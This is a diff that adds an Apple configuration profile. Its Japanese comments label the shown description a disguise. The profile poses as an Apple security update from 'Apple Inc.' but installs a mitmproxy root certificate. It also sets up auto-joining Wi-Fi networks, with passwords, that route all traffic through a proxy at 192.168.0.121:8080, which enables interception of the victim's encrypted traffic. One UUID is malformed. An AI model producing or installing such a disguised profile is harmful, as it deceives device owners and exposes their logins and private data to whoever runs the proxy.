@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <!-- ▼▼▼ 表示される説明文（偽装バージョン） ▼▼▼ -->
+    <key>PayloadDisplayName</key>
+    <string>Apple デバイスのセキュリティアップデート</string>
+    <key>PayloadDescription</key>
+    <string>このアップデートはデバイスのセキュリティを強化し、すべてのユーザに推奨されます。</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.update.2025-08-15.final</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Inc.</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>1E6A8248-2C6C-42A4-A82F-7278303C0086</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    
+    <!-- ▼▼▼ 実際の機能部分（完成版） ▼▼▼ -->
+    <key>PayloadContent</key>
+    <array>
+        <!-- ペイロード 1: ルート証明書 -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>Apple Root Certification Authority</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.security.root-ca.g3.v4</string>
+            <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadUUID</key>
+            <string>3A8C0460-4E8E-44C6-A041-9490525E22A8</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadContent</key>
+            <data>
+            MIIDNTCCAh2gAwIBAgIUVfj03e+awQHg4N2nPK+nxRu2X5IwDQYJKoZIhvcNAQEL
+            BQAwKDESMBAGA1UEAwwJbWl0bXByb3h5MRIwEAYDVQQKDAltaXRtcHJveHkwHhcN
+            MjUwODEzMDIzMzI3WhcNMzUwODEzMDIzMzI3WjAoMRIwEAYDVQQDDAltaXRtcHJv
+            eHkxEjAQBgNVBAoMCW1pdG1wcm94eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+            AQoCggEBAKUqDSCb+jzf0+UkgRQzRE+Hobbem10ZgBXCPFPkwppWN5j6nCb6K7X0
+            PitaHx/dCw3K9Ovkz5hdirPX9DV/qYVi0CFqxGhHzLjUK3BVjePXgdGRHIji0wMi
+            WVNq1hSr8I+AkHmzXKScz+QmhB5W/rXBT8RI+9zXPmyq9wRYGpVx2OZd8c+Q8SIc
+            5UwVrHj0xcpGKvTHKW13n/KKwdmPCzrCOzqNYlxInn3NTZtwUDYy8fwK9LYDod8Z
+            sOuFfxWbovti5zc6L4q6k9+ORDe1+OFbqNtfYS6FimiyhgDFeVgukpMXMKnRN8Mu
+            Pa4l9rSy15RkjBetLSt9K2FLhAKhST0CAwEAAaNXMFUwDwYDVR0TAQH/BAUwAwEB
+            /zATBgNVHSUEDDAKBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCAQYwHQYDVR0OBBYE
+            FLmZ0Q2AtdU/MXb5hyiP8HfN/MlTMA0GCSqGSIb3DQEBCwUAA4IBAQBbMI/gh9eT
+            ITRgxbxqqN4gmclJXYCvGNjfdIsA9rJr2TUPDLj4oGyMubi4NMBWouUjL30uWbBz
+            XpD0YWu82hj19P7PoXZuJ/0jq7mCmNvTzB422itFT/4u/tm73xLa5yKPOUgmcxnW
+            2ybmpO1QUrVVFSnnsmdaaeU3mQ77k+r0SItxT5xUeBsu4lYdPu0eLYHm0nlLMOnH
+            dK/UThAKvJMA+6/5blXeJHMUwgp3bnRfkHE7CzlfNijEZWuZKfKPTrVhOg9zi09Z
+            APSmeDdNM1yrgyQD8N3a7NKrGFgl63wt6VuIloMRx+tO0rlxD5/AhHC6XqzwFrYJ
+            srPiBaJoAq7+
+            </data>
+        </dict>
+        
+        <!-- ペイロード 2: Wi-Fiネットワーク設定 (5GHz) + プロキシ -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>Wi-Fi ネットワーク (TP-Link_E797_5G)</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.wifi.managed.5ghz.v1</string>
+            <key>PayloadType</key>
+            <string>com.apple.wifi.managed</string>
+            <key>PayloadUUID</key>
+            <string>4F2A7A58-2D79-4B04-874C-1A3E2D8F9C6D</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>SSID_STR</key>
+            <string>TP-Link_E797_5G</string>
+            <key>EncryptionType</key>
+            <string>WPA2</string>
+            <key>Password</key>
+            <string>85747975</string>
+            <key>AutoJoin</key>
+            <true/>
+            <key>ProxyType</key>
+            <string>Manual</string>
+            <key>ProxyServer</key>
+            <string>192.168.0.121</string>
+            <key>ProxyServerPort</key>
+            <integer>8080</integer>
+        </dict>
+        
+        <!-- ペイロード 3: Wi-Fiネットワーク設定 (2.4GHz) + プロキシ -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>Wi-Fi ネットワーク (TP-Link_E797)</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.wifi.managed.2ghz.v1</string>
+            <key>PayloadType</key>
+            <string>com.apple.wifi.managed</string>
+            <key>PayloadUUID</key>
+            <string>A1B2C3D4-E5F6-G7H8-I9J0-K1L2M3N4O5P6</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>SSID_STR</key>
+            <string>TP-Link_E797</string>
+            <key>EncryptionType</key>
+            <string>WPA2</string>
+            <key>Password</key>
+            <string>85747975</string>
+            <key>AutoJoin</key>
+            <true/>
+            <key>ProxyType</key>
+            <string>Manual</string>
+            <key>ProxyServer</key>
+            <string>192.168.0.121</string>
+            <key>ProxyServerPort</key>
+            <integer>8080</integer>
+        </dict>
+    </array>
+</dict>
+</plist>
